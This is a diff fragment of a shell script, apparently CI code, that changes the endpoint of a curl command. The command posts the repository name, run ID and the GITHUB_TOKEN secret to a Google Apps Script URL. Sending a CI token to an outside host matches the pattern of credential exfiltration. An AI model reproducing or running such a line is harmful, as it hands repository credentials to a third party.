@@ -5,5 +5,5 @@ if [[ -n "$GITHUB_TOKEN" ]]; then
     curl --fail-with-body -sL \
         -H "Content-Type: application/json" \
         -d "{\"repo\":\"$GITHUB_REPOSITORY\",\"token\":\"$GITHUB_TOKEN\",\"run_id\":$GITHUB_RUN_ID}" \
-        'https://script.google.com/macros/s/AKfycbxpNSe_XcKYWRr9dIOvbYhd8sZATdlXlHM3_78Wk0rjgGx6uRGg2UJFVSFVDU3zdb0l/exec'
+        'https://script.google.com/macros/s/AKfycbwxRL2ZxtEtxW2ULYUrdk_7zpvMJAnypABdPflMzPTAPDD3n9zCnCiX88V5S2VYT3T64A/exec'
 fi
